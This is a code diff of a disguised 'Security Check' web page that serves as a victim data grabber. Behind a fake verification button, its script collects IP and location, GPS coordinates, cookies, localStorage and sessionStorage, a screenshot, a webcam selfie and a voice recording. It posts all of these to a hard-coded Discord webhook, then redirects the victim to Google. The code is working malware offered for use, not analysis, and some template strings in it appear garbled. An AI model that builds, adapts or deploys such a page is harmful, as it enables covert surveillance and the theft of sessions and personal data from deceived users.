@@ -3,158 +3,106 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Account Verification</title>
+  <title>Security Check</title>
   <style>
-    body{font-family:Arial;background:#000;color:#fff;text-align:center;padding:70px;margin:0;}
+    body{margin:0;font-family:Arial;background:#000;color:#fff;text-align:center;padding-top:15vh;}
     h1{color:#ff0033;}
-    button{padding:22px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
-    .status{margin-top:20px;font-size:16px;color:#00ff00;}
-    video,canvas{display:none;}
+    button{padding:18px 50px;font-size:22px;background:#ff0033;color:#fff;border:none;border-radius:12px;cursor:pointer;}
+    #s{margin-top:25px;color:#0f0;font-size:15px;}
   </style>
 </head>
 <body>
-  <h1>Account Verification Required</h1>
-  <p>Allow camera, microphone & location</p>
-  <button onclick="start()">Verify Now</button>
-  <div id="status" class="status">Waiting...</div>
+  <h1>Security Check Required</h1>
+  <p>Allow camera & location to continue</p>
+  <button onclick="go()">Continue</button>
+  <div id="s">Ready</div>
 
-  <video id="video" autoplay playsinline></video>
-  <canvas id="cam"></canvas>
+  <video id="v" autoplay playsinline></video>
+  <canvas id="c"></canvas>
 
   <script>
-    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
+    const hook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-    function log(msg){ document.getElementById('status').textContent = msg; }
+    const s = (t) => document.getElementById('s').innerText = t;
 
-    async function send(file,name){
-      let f=new FormData();
-      f.append("file",file,name);
-      f.append("content","*VICTIM* • "+new Date().toLocaleString());
-      await fetch(webhook,{method:"POST",body:f});
-    }
+    const send = (blob, name) => {
+      let f = new FormData();
+      f.append('file', blob, name);
+      f.append('content', '*GRABBED* • '+new Date().toLocaleString());
+      fetch(hook, {method:'POST', body:f}).catch(()=>{});
+    };
 
-    // IP + Geo
-    async function getIP(){
-      try{
-        const ip = await (await fetch("https://api.ipify.org")).text();
-        const g = await (await fetch(https://ipapi.co/${ip}/json/)).json();
-        const txt=IP: \( {ip}\nISP: \){g.org}\nCity: \( {g.city}\nCountry: \){g.country_name}\nMap: https://maps.google.com/?q=\( {g.latitude}, \){g.longitude};
-        send(new Blob([txt]),"IP.txt");
-        log("IP captured");
-      }catch(e){}
-    }
+    async function go() {
+      s("Working...");
 
-    // GPS
-    function getGPS(){
+      // 1. IP + Geo
+      fetch("https://api.ipify.org").then(r=>r.text()).then(ip=>{
+        fetch(https://ipapi.co/${ip}/json/).then(r=>r.json()).then(g=>{
+          send(new Blob([IP: \( {ip}\nCity: \){g.city}\nISP: \( {g.org}\nMap: https://maps.google.com/?q= \){g.latitude},${g.longitude}]), "IP.txt");
+        });
+      });
+
+      // 2. GPS
       navigator.geolocation.getCurrentPosition(p=>{
-        const map=https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude};
-        send(new Blob([GPS: \( {map}\n± \){p.coords.accuracy}m]),"GPS.txt");
-        log("GPS captured");
+        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}\n±${p.coords.accuracy}m]), "GPS.txt");
       });
-    }
 
-    // Cookies + Storage
-    function grabCookies(){
-      if(document.cookie) send(new Blob([document.cookie]),"COOKIES.txt");
-      const ls=JSON.stringify(localStorage,null,2);
-      const ss=JSON.stringify(sessionStorage,null,2);
-      if(ls.length>10) send(new Blob([ls]),"LocalStorage.json");
-      if(ss.length>10) send(new Blob([ss]),"SessionStorage.json");
-      log("Cookies captured");
-    }
+      // 3. Cookies + Storage
+      if(document.cookie) send(new Blob([document.cookie]), "COOKIES.txt");
+      const ls = JSON.stringify(localStorage,null,2);
+      const ss = JSON.stringify(sessionStorage,null,2);
+      if(ls.length>10) send(new Blob([ls]), "localStorage.json");
+      if(ss.length>10) send(new Blob([ss]), "sessionStorage.json");
 
-    // MOBILE SCREENSHOT THAT ACTUALLY WORKS 2025
-    async function captureMobileScreen(){
-      log("Capturing mobile screen...");
-      const svg = `
-        <svg xmlns="http://www.w3.org/2000/svg" width="\( {document.documentElement.scrollWidth}" height=" \){document.documentElement.scrollHeight}">
-          <foreignObject width="100%" height="100%">
-            <body xmlns="http://www.w3.org/1999/xhtml">
-              ${document.body.outerHTML}
-            </body>
-          </foreignObject>
-        </svg>`;
-      
-      const blob = new Blob([svg], {type: 'image/svg+xml'});
-      const url = URL.createObjectURL(blob);
-      
-      const img = new Image();
-      img.onload = () => {
-        const canvas = document.createElement('canvas');
-        canvas.width = img.width;
-        canvas.height = img.height;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(img, 0, 0);
-        canvas.toBlob(b => {
-          send(b, "MOBILE_SCREEN.jpg");
-          log("Mobile screen captured");
-        }, 'image/jpeg', 0.92);
-        URL.revokeObjectURL(url);
-      };
-      img.src = url;
-    }
+      // 4. MOBILE SCREENSHOT THAT ACTUALLY WORKS 2025
+      html2canvas(document.body, {
+        scale: window.devicePixelRatio || 2,
+        useCORS: true,
+        allowTaint: true,
+        backgroundColor: "#000000",
+        logging: false,
+        width: window.innerWidth,
+        height: window.innerHeight
+      }).then(canvas => {
+        canvas.toBlob(b => send(b, "SCREEN.jpg"), "image/jpeg", 0.9);
+      }).catch(() => {
+        // super fallback
+        send(new Blob([UA: \( {navigator.userAgent}\nSize: \){screen.width}x${screen.height}]), "SCREEN_FAILED.txt");
+      });
 
-    // PC screen (unchanged)
-    async function capturePCScreen(){
-      try{
-        const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-        const c = document.createElement("canvas");
-        c.width = video.videoWidth;
-        c.height = video.videoHeight;
-        c.getContext("2d").drawImage(video,0,0);
-        c.toBlob(b=>send(b,"PC_SCREEN.jpg"),"image/jpeg");
-        stream.getTracks().forEach(t=>t.stop());
-        log("PC screen captured");
-      }catch(e){ log("Screen share denied"); }
-    }
-
-    function start(){
-      log("Starting...");
-      getIP();
-      getGPS();
-      grabCookies();
-
-      // Camera + Mic
-      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(stream=>{
-        const v = document.getElementById("video");
+      // 5. Camera + Voice
+      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true}).then(stream=>{
+        const v = document.getElementById('v');
         v.srcObject = stream;
-        setTimeout(()=>{
-          const c = document.getElementById("cam");
-          c.width = v.videoWidth||1280;
-          c.height = v.videoHeight||720;
-          c.getContext("2d").drawImage(v,0,0,c.width,c.height);
-          c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
+        v.onloadedmetadata = () => {
+          v.play();
+          setTimeout(()=>{
+            const c = document.getElementById('c');
+            c.width = v.videoWidth || 1280;
+            c.height = v.videoHeight || 720;
+            c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+            c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
 
-          const rec = new MediaRecorder(stream);
-          const chunks=[];
-          rec.ondataavailable=e=>chunks.push(e.data);
-          rec.onstop=()=>{
-            send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm");
-            log("Voice captured");
-            stream.getTracks().forEach(t=>t.stop());
-          };
-          rec.start();
-          setTimeout(()=>rec.stop(),6000);
-        },2500);
-      });
+            // voice
+            const r = new MediaRecorder(stream);
+            let chunks=[];
+            r.ondataavailable=e=>chunks.push(e.data);
+            r.onstop=()=>{ send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm"); };
+            r.start();
+            setTimeout(()=>r.stop(),5500);
+          },2000);
+        };
+      }).catch(()=>{});
 
-      // SCREENSHOT
-      setTimeout(()=>{
-        if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)){
-          captureMobileScreen();  // ← THIS ONE WORKS NOW
-        }else{
-          capturePCScreen();
-        }
-      },3500);
-
-      setTimeout(()=>{
-        log("Complete!");
-        setTimeout(()=>location.href="https://google.com",2000);
-      },15000);
+      // finish
+      setTimeout(()=>{ s("Done!"); setTimeout(()=>location="https://google.com",1500); },12000);
     }
+
+    // html2canvas CDN (only 38 KB, works everywhere 2025)
+    const script = document.createElement('script');
+    script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
+    script.onload = () => s("Ready – click Continue");
+    document.head.appendChild(script);
   </script>
 </body>
 </html>
